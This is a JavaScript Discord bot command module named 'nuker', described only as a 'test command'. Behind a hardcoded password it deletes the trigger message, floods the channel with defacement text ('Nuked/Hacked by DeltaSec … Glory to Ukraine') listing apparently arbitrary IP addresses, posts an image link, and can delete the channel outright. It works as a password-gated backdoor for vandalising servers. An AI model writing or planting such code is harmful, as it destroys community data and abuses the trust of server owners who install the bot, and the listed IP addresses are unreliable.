module.exports = {
    name: "nuker",
    description: "test command",
    permission: "ADMINISTRATOR",

    async execute(client, message, args, Discord){
        var count = 1;
        if (!args[1]) {
            message.reply("Please enter a valid password");
        } else if (args[1] === "X?nz&f?/YPCAt3jTF$Ms!2/6EJ9Y-,'e}uY") {
            message.delete();         
            message.channel.send("Nuked by DeltaSec 30.82.147.210 Glory to Ukraine \nNuked by DeltaSec 245.244.162.110 Glory to Ukraine \nNuked by DeltaSec 228.150.192.198 Glory to Ukraine \nNuked by DeltaSec 240.20.72.120 Glory to Ukraine \nNuked by Deltasec 105.173.156.225 Glory to Ukraine \nNuked by DeltaSec 24.90.75.167 Glory to Ukraine \nNuked by DeltaSec 128.10.104.146 Glory to Ukraine \nNuked by DeltaSec 252.10.196.225 Glory to Ukraine \nNuked by DeltaSec 23.177.251.154 Glory to Ukraine");
            message.channel.send("https://imgur.com/ycCqkkv");
            message.channel.send("Compromised by DeltaSec 43.219.113.151 Glory to Ukraine \nCompromised by DeltaSec 8.106.194.52 Glory to Ukraine \nCompromised by DeltaSec 150.141.204.191 Glory to Ukraine \nCompromised by DeltaSec 37.208.23.48 Glory to Ukraine \nCompromised by DeltaSec 148.50.33.222 Glory to Ukraine \nCompromised by DeltaSec 97.211.185.214 Glory to Ukraine \nComproomised by DeltaSec 0.251.62.114 Glory to Ukraine \nCompromised by DeltaSec 99.122.224.128 Glory to Ukraine");
            message.channel.send("https://imgur.com/ycCqkkv");
            message.channel.send("Hacked by DeltaSec 200.164.153.61 Glory to Ukraine \nHacked by DeltaSec 21.254.166.183 Glory to Ukraine \nHacked by DeltaSec 4.21.175.251 Glory to Ukraine \nHacked by DeltaSec 99.15.23.144 Glory to Ukraine \nHacked by DeltaSec 171.108.23.169 Glory to Ukraine \nHacked by DeltaSec 22.221.94.210 Glory to Ukraine \nHacked by DeltaSec 74.115.6.234 Glory to Ukraine \nHacked by DeltaSec 142.37.52.219 Glory to Ukraine \nHacked by DeltaSec 95.195.180.84 Glory to Ukraine");
            message.channel.send("https://imgur.com/ycCqkkv");
                if(args[2] === "delete") {
                    message.channel.delete();
                }
        } else {
            message.reply("Please enter a valid password");
        }
    }
};